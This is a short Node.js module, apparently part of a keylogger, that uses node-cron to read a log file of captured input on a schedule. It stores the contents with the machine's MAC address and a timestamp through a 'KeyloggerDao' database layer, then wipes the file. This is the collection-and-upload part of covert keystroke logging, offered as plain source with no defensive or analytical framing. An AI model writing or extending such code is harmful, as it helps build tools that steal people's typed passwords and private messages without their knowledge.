const cron = require("node-cron");
const { CRON_EXPRESSION, MAC } = require("../constant/contant");
const { KeyloggerDao } = require("../dao/keylogger_dao");
const Logger = require("../model/logger");
const { FileUtil } = require("./file_util");

const task = () => {
    let taskTemp = cron.schedule(CRON_EXPRESSION, () => {
        FileUtil.readFile((data) => {
            KeyloggerDao.insert(new Logger( null, MAC, new Date(), data));
            FileUtil.writeFile("");//clear file
        })
    })   
    
    taskTemp.start();
}



module.exports = { task };